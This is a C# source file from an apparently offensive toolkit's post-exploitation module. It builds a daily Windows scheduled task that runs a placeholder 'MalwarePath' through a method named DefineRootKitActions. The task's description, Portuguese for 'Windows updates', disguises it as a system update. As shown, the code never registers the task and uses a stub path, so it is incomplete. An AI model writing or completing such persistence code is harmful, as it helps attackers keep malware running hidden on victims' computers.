using Barsa.Commons;
using MediatR;
using Microsoft.Win32.TaskScheduler;
using System;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;
using Task = System.Threading.Tasks.Task;

namespace Caronte.Modules.PostExploitation.TaskScheduler
{
    public class TaskSchedulerCommandHandler : IRequestHandler<TaskSchedulerCommand, CommonResponse>
    {
        public Task<CommonResponse> Handle(TaskSchedulerCommand request, CancellationToken cancellationToken)
        {
            CommonResponse response = new();

            using (TaskService taskService = new())
            {
                TaskDefinition taskDefinition = taskService.NewTask();

                taskDefinition.RegistrationInfo.Description = "Atualizações do windows";
                taskDefinition.Triggers.Add(new DailyTrigger() { DaysInterval = 1 });

                taskDefinition.Actions.AddRange(DefineRootKitActions());
            }

            return Task.FromResult(response);
        }

        private List<ExecAction> DefineRootKitActions()
        {
            return new List<ExecAction>()
            {
                new ExecAction("MalwarePath")
            };
        }
    }
}
